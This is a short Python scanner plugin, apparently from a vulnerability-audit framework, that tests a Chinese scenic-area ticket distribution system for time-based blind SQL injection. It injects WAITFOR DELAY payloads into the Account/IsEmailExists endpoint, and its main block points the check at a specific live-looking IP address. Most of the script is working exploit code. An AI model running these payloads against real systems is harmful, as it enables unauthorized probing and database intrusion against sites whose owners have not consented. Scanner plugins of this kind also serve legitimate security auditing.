#!/usr/bin/env python
# -*- coding: utf-8 -*-
#智旅天下景区分销系统SQL注入
import time
def assign(service, arg):
    if service == "atripower":
        return True, arg

def audit(arg):
    url = arg + "Account/IsEmailExists?Email=admin%40qq.com&UserName=admin"
    t1 = time.time()
    code1,_,_,_,_ = curl.curl2(url+"';WAITFOR+DELAY+'0:0:0'--")
    true_time = time.time() - t1
    t2 = time.time()
    url1=url + "';WAITFOR+DELAY+'0:0:5'--"
    code2,_,res,_,_ = curl.curl2(url1)
    false_time = time.time() - t2
    if code1==200 and code2 == 200 and false_time-true_time>4.5:
        security_hole(url1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('atripower', 'http://111.39.56.7/')[1])